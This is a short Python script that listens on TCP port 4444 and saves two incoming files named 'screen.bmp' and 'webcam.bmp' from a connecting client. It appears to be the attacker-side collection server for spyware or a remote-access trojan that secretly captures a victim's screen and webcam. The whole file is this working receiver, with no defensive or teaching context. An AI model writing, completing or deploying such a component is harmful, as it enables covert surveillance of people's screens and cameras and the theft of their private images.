import socket, struct

HOST = "0.0.0.0"
PORT = 4444

def recv_exact(conn, n):
    data = b""
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def recv_file(conn, filename):
    raw = recv_exact(conn, 4) #Read 4 bytes size packed
    if not raw:
        print(f"[-] Disconnect {filename}")
        return
    size = struct.unpack("<I", raw)[0] #Unpack 4 bytes to real size
    if size == 0:
        print(f"[-] {filename}: (size = 0)")
        return

    print(f"[+] Received {filename}: {size} bytes")
    data = recv_exact(conn, size) #Read next (unpack(size)) real size
    if not data:
        print(f"[-] Disconnected")
        return

    with open(filename, "wb") as f:
        f.write(data)
    print(f"[+] Saved: {filename}")

with socket.socket() as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print("[*] Waiting...")
    conn, addr = s.accept()
    print(f"[+] Connect From: {addr}")
    with conn:
        recv_file(conn, "screen.bmp")
        recv_file(conn, "webcam.bmp")